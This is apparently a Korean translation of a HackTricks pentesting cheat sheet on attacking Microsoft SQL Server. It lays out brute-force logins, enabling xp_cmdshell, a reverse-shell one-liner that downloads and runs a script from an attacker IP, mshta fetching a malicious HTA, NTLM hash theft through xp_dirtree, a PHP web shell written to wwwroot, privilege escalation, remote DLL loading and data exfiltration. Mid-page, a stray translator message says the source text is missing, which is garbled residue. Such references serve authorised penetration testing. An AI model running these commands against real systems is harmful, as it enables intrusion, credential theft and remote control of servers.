# 1433 - Pentesting MSSQL - Microsoft SQL Server

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

출처: [wikipedia](https://en.wikipedia.org/wiki/Microsoft_SQL_Server):

> **Microsoft SQL Server**는 Microsoft에서 개발한 **관계형 데이터베이스** 관리 시스템입니다. 데이터베이스 서버로서, 다른 소프트웨어 애플리케이션의 요청에 따라 데이터를 저장하고 검색하는 것이 주된 기능인 소프트웨어 제품입니다—이 애플리케이션들은 동일한 컴퓨터에서 실행될 수도 있고 네트워크(인터넷 포함)를 통해 다른 컴퓨터에서 실행될 수도 있습니다.

**기본 포트:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### 관리형 Database-as-a-Service (DBaaS)에 접근했을 때

DBaaS에서는 "owning the host"(예: privilege escalation, lateral movement, OS command execution 등)에 의존하는 모든 것이 더 이상 적용되지 않습니다. 이러한 환경에서의 pentesting은 application-layer exploitation, SQL logic을 통한 data exfiltration, 잘못 구성된 IAM roles, 또는 취약한 네트워크/VPC 설계로 전환해야 합니다. 예를 들어, [Amazon RDS documentation](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/SQLServer.Concepts.General.FeatureNonSupport.html)에는 `xp_cmdshell`과 `TRUSTWORTHY` 데이터베이스 속성이 지원되지 않는다고 명시되어 있습니다.

> [!WARNING]
> 당신은 서버가 아닌 데이터베이스 엔드포인트를 받습니다. 클라우드 제공업체가 호스트 OS, 데이터베이스 엔진 바이너리 및 많은 보안 정책을 관리합니다.

### **Default MS-SQL System Tables**

- **master Database**: 이 데이터베이스는 SQL Server 인스턴스의 모든 시스템 수준 세부 정보를 캡처하므로 매우 중요합니다.
- **msdb Database**: SQL Server Agent는 경고와 작업의 스케줄 관리를 위해 이 데이터베이스를 사용합니다.
- **model Database**: SQL Server 인스턴스의 모든 새 데이터베이스의 템플릿 역할을 하며, 크기, collation, recovery model 등과 같은 변경사항이 새로 생성된 데이터베이스에 반영됩니다.
- **Resource Database**: SQL Server에 포함된 시스템 객체를 보관하는 읽기 전용 데이터베이스입니다. 이러한 객체들은 물리적으로는 Resource database에 저장되지만 논리적으로는 모든 데이터베이스의 sys 스키마에 표시됩니다.
- **tempdb Database**: 일시적인 객체나 중간 결과 집합을 위한 임시 저장 영역으로 사용됩니다.

## 열거

### 자동 열거

서비스에 대해 아무 정보가 없다면:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
> [!TIP]
> **가지고 있지 않다면** **credentials**를 추측해 볼 수 있습니다. nmap이나 metasploit을 사용할 수 있습니다. 주의하세요. 기존 사용자 이름으로 로그인에 여러 번 실패하면 **계정이 차단될 수 있습니다**.
#### Metasploit (need creds)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Brute force**](../../generic-hacking/brute-force.md#sql-server)

### Manual Enumeration

#### Login

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### 일반적인 열거
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
```
#### 사용자 가져오기


{{#ref}}
types-of-mssql-users.md
{{#endref}}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### 권한 획득

1. **Securable:** SQL Server가 접근 제어를 위해 관리하는 리소스를 의미합니다. 이들은 다음과 같이 분류됩니다:
- **Server** – 예: 데이터베이스, logins, endpoints, availability groups, server roles.
- **Database** – 예: database role, application roles, schema, certificates, full text catalogs, users.
- **Schema** – 테이블, 뷰, 프로시저, 함수, 동의어(synonyms) 등 포함됩니다.
2. **Permission:** SQL Server의 securables에 연관된 권한으로, ALTER, CONTROL, CREATE 같은 권한을 principal에게 부여할 수 있습니다. 권한 관리는 두 수준에서 이루어집니다:
- **Server Level** — logins 사용
- **Database Level** — users 사용
3. **Principal:** securable에 권한이 부여되는 주체를 의미합니다. Principal은 주로 logins와 database users를 포함합니다. Securable에 대한 접근 제어는 권한을 부여하거나 거부하거나, 접근 권한이 부여된 역할(roles)에 logins와 users를 포함시키는 방식으로 이루어집니다.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## 트릭

### OS 명령 실행

> [!CAUTION]
> 명령을 실행할 수 있으려면 **`xp_cmdshell`**이 **활성화되어** 있어야 할 뿐만 아니라 **`xp_cmdshell` 저장 프로시저에 대한 EXECUTE 권한**도 있어야 합니다. 다음 명령으로 (sysadmins을 제외한) 누가 **`xp_cmdshell`**을 사용할 수 있는지 확인할 수 있습니다:
>
> ```sql
> Use master
> EXEC sp_helprotect 'xp_cmdshell'
> ```
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Executing custom assembly on the current server with windows authentication and executing hostname command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
```
### WMI 기반 원격 SQL 수집 (sqlcmd + CSV export)

오퍼레이터는 IIS/app 계층에서 WMI를 사용해 MSSQL에 인증하고 ad‑hoc 쿼리를 실행하여 결과를 CSV로 내보내는 작은 배치 파일을 실행해 SQL Servers로 피벗할 수 있습니다. 이렇게 하면 수집이 단순해지고 관리자 활동과 자연스럽게 어우러집니다.

예시 mssq.bat
```bat
@echo off
rem Usage: mssq.bat <server> <user> <pass> <"SQL"> <out.csv>
set S=%1
set U=%2
set P=%3
set Q=%4
set O=%5
rem Remove headers, trim trailing spaces, CSV separator = comma
sqlcmd -S %S% -U %U% -P %P% -Q "SET NOCOUNT ON; %Q%" -W -h -1 -s "," -o "%O%"
```
WMI로 원격에서 호출하세요.
```cmd
wmic /node:SQLHOST /user:DOMAIN\user /password:Passw0rd! process call create "cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd \"SELECT TOP(100) name FROM sys.tables\" C:\\Windows\\Temp\\out.csv"
```
PowerShell 대안
```powershell
$cmd = 'cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd "SELECT name FROM sys.databases" C:\\Windows\\Temp\\dbs.csv'
Invoke-WmiMethod -ComputerName SQLHOST -Class Win32_Process -Name Create -ArgumentList $cmd
```
참고
- sqlcmd가 없을 수 있습니다. 이 경우 osql, PowerShell의 Invoke-Sqlcmd 또는 System.Data.SqlClient를 사용하는 one-liner로 대체하세요.
- 따옴표 처리를 신중히 하세요; 긴/복잡한 쿼리는 파일로 제공하거나 batch/PowerShell 스텁 내부에서 디코드되는 Base64로 인코딩된 인수로 전달하는 것이 더 쉽습니다.
- CSV를 SMB를 통해 Exfil하세요(예: \\SQLHOST\C$\Windows\Temp에서 복사) 또는 압축해 C2를 통해 이동시키세요.



### 해시된 비밀번호 가져오기
```bash
SELECT * FROM master.sys.syslogins;
```
### 탈취 NetNTLM hash / Relay attack

인증에 사용된 해시를 캡처하려면 **SMB server**를 시작하세요 (`impacket-smbserver` 또는 `responder` 등).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
> [!WARNING]
> 다음 SQL 함수들(MSSQL)을 시스템 관리자 제외 누가 실행할 수 있는지 확인하려면 다음을 사용하세요:
>
> ```sql
> Use master;
> EXEC sp_helprotect 'xp_dirtree';
> EXEC sp_helprotect 'xp_subdirs';
> EXEC sp_helprotect 'xp_fileexist';
> ```

Using tools such as **responder** or **Inveigh** it's possible to **steal the NetNTLM hash**.  
이 도구들의 사용법은 다음에서 확인할 수 있습니다:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Abusing MSSQL trusted Links

[**Read this post**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **해당 기능을 악용하는 방법에 대한 자세한 정보는 다음을 확인하세요:**

{{#ref}}
../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md
{{#endref}}

### **파일 쓰기**

`MSSQL`을 사용해 파일을 쓰려면 [**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)를 활성화해야 하며(이는 관리자 권한이 필요합니다), 그 후 파일을 생성하기 위해 몇 가지 저장 프로시저를 실행해야 합니다:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **OPENROWSET로 파일 읽기**

기본적으로 `MSSQL`은 **계정이 읽기 권한을 가진 운영체제의 모든 파일에 대한 읽기**를 허용합니다. 다음 SQL 쿼리를 사용할 수 있습니다:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
하지만, **`BULK`** 옵션은 **`ADMINISTER BULK OPERATIONS`** 또는 **`ADMINISTER DATABASE BULK OPERATIONS`** 권한이 필요합니다.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### SQLi를 위한 에러 기반 벡터:
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/파일 읽기 및 스크립트 실행 (Python 및 R)**

MSSQL는 **Python 및/또는 R로 작성된 스크립트**를 실행할 수 있게 해줄 수 있습니다. 이 코드들은 명령을 실행하기 위해 **xp_cmdshell**을 사용하는 사용자와는 **다른 사용자** 권한으로 실행됩니다.

Example trying to execute a **'R'** _"Hellow World!"_ **not working**:

![](<../../images/image (393).png>)

Example using configured python to perform several actions:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### 레지스트리 읽기

Microsoft SQL Server는 네트워크뿐만 아니라 파일 시스템 및 심지어 [**Windows Registry**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)**:** 와도 상호작용할 수 있도록 하는 **여러 확장 저장 프로시저**를 제공합니다.

| **일반**                    | **인스턴스 인식**                     |
| --------------------------- | ------------------------------------ |
| sys.xp_regread              | sys.xp_instance_regread              |
| sys.xp_regenumvalues        | sys.xp_instance_regenumvalues        |
| sys.xp_regenumkeys          | sys.xp_instance_regenumkeys          |
| sys.xp_regwrite             | sys.xp_instance_regwrite             |
| sys.xp_regdeletevalue       | sys.xp_instance_regdeletevalue       |
| sys.xp_regdeletekey         | sys.xp_instance_regdeletekey         |
| sys.xp_regaddmultistring    | sys.xp_instance_regaddmultistring    |
| sys.xp_regremovemultistring | sys.xp_instance_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
더 많은 예제를 보려면 [**original source**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)를 확인하세요.

### RCE with MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

MSSQL 내에서 사용자 정의 함수로 .NET dll을 로드할 수 있습니다. 다만, 이는 **`dbo` 권한을 필요로 하므로** 데이터베이스에 **`sa` 또는 관리자(Administrator) 역할**로 연결되어 있어야 합니다.

[**Following this link**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp)에서 예제를 확인하세요.

### RCE with `autoadmin_task_agents`

해당 게시물[ **to this post**](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp), 원격 dll을 로드하여 MSSQL이 이를 실행하도록 만드는 것도 다음과 같은 방식으로 가능합니다:
```sql
update autoadmin_task_agents set task_assembly_name = "class.dll", task_assembly_path="\\remote-server\\ping.dll",className="Class1.Class1";
```
원문 내용이 보이지 않습니다. src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md 파일의 마크다운 내용을 여기에 붙여 넣어 주시면, 요청하신 지침(코드·링크·태그 보존 등)을 준수해 한국어로 번역해 드리겠습니다.
```csharp
using Microsoft.SqlServer.SmartAdmin;
using System;
using System.Diagnostics;

namespace Class1
{
public class Class1 : TaskAgent
{
public Class1()
{

Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c ping localhost -t";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
process.WaitForExit();
}

public override void DoWork()
{

}

public override void ExternalJob(string command, LogBaseService jobLogger)
{

}

public override void Start(IServicesFactory services)
{

}

public override void Stop()
{

}


public void Test()
{

}
}
}
```
### RCE를 달성하는 다른 방법들

명령 실행을 얻기 위한 다른 방법들도 있으며, 예를 들어 [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), 및 [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql)을 추가하는 방법이 있습니다.

## MSSQL 권한 상승

### db_owner에서 sysadmin으로

만약 **일반 사용자**가 **`db_owner`** 역할을 **관리자가 소유한 데이터베이스**(예: **`sa`**)에 대해 부여받고, 그 데이터베이스가 **`trustworthy`**로 구성되어 있다면, 그 사용자는 해당 권한을 악용하여 **privesc**를 수행할 수 있습니다. 그 이유는 해당 데이터베이스에 생성된 **stored procedures**가 소유자(관리자) 권한으로 **execute**될 수 있기 때문입니다.
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
다음의 **metasploit** 모듈을 사용할 수 있습니다:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
또는 **PS** script:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### 다른 사용자로의 가장

SQL Server에는 **`IMPERSONATE`**라는 특수 권한이 있으며, 이는 실행 사용자가 **다른 사용자나 login의 권한을 대신 행사할 수** 있게 하며, 컨텍스트가 재설정되거나 세션이 종료될 때까지 그 권한이 유지됩니다.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

# If you can't find any users, make sure to check for links
enum_links
# If there is a link of interest, re-run the above steps on each link
use_link [NAME]
```
> [!TIP]
> 사용자를 가장할 수 있다면, 그가 sysadmin이 아니더라도, **사용자가 접근 권한이 있는지** 다른 **데이터베이스**나 linked servers에 접근 가능한지 확인해야 합니다.
>
> 참고로 일단 sysadmin이 되면 다른 어떤 계정도 가장할 수 있습니다:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
이 공격은 **metasploit** 모듈로 수행할 수 있습니다:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
또는 **PS** 스크립트로:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## MSSQL을 이용한 지속성 확보

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## SQL Server Linked Servers에서 암호 추출

An attacker can extract SQL Server Linked Servers passwords from the SQL Instances and get them in clear text, granting the attacker passwords that can be used to acquire a greater foothold on the target. The script to extract and decrypt the passwords stored for the Linked Servers can be found [here](https://www.richardswinbank.net/admin/extract_linked_server_passwords)

이 익스플로잇이 작동하려면 몇 가지 요구사항과 설정이 필요하다. 우선, 머신에서 Administrator 권한이 있거나 SQL Server 구성을 관리할 수 있는 권한이 있어야 한다.

권한을 확인한 후 다음 세 가지를 구성해야 한다:

1. SQL Server 인스턴스에서 TCP/IP를 활성화한다;
2. 시작 매개변수를 추가한다. 이 경우 트레이스 플래그인 -T7806을 추가한다.
3. 원격 관리자 연결을 활성화한다.

이 구성들을 자동화하기 위해, [this repository ](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/)has the needed scripts. 구성의 각 단계마다 powershell 스크립트가 있을 뿐만 아니라, 구성 스크립트와 암호 추출 및 복호화를 결합한 전체 스크립트도 포함되어 있다.

자세한 정보는 이 공격과 관련된 다음 링크들을 참조하라: [Decrypting MSSQL Database Link Server Passwords](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[Troubleshooting the SQL Server Dedicated Administrator Connection](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## 로컬 권한 상승

MSSQL 서버를 실행하는 사용자는 권한 토큰 **SeImpersonatePrivilege.**\
다음 두 가지 방법 중 하나를 통해 **Administrator로 권한 상승**이 가능할 것이다:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/juicypotato.md
{{#endref}}

## Shodan

- `port:1433 !HTTP`

## 참고자료

- [Unit 42 – Phantom Taurus: WMI-driven direct SQL collection via batch/sqlcmd](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
- [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)
- [https://mayfly277.github.io/posts/GOADv2-pwning-part12/](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)


- [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
- [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
